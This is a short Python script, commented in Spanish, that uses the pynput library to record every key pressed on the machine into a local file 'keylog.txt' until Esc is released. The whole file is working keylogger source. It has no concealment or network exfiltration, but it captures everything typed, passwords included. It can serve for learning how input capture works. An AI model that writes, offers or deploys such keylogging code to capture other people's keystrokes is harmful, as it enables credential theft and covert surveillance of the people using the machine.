from pynput.keyboard import Key, Listener

# Ruta al archivo donde se guardarán las teclas presionadas
log_file = "keylog.txt"

def on_press(key):
    """
    Registra cada tecla presionada en un archivo de texto.

    Args:
        key (Key): La tecla presionada detectada por el Listener.

    Esta función escribe el carácter asociado a la tecla presionada en el archivo especificado.
    Si la tecla no tiene un carácter asociado (como teclas especiales), se registra un formato especial.
    Las teclas de espacio y enter se traducen a espacios y saltos de línea, respectivamente.
    """
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key}]")

def on_release(key):
    """
    Detecta la liberación de la tecla 'esc' para detener el Listener.

    Args:
        key (Key): La tecla liberada.

    Returns:
        bool: False si la tecla liberada es 'esc', deteniendo el Listener. None en cualquier otro caso.
    """
    if key == Key.esc:
        # Si se presiona 'esc', detiene el Listener.
        return False
    
if __name__ == "__main__":
    # Inicializa y ejecuta el Listener para capturar eventos de teclado.
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()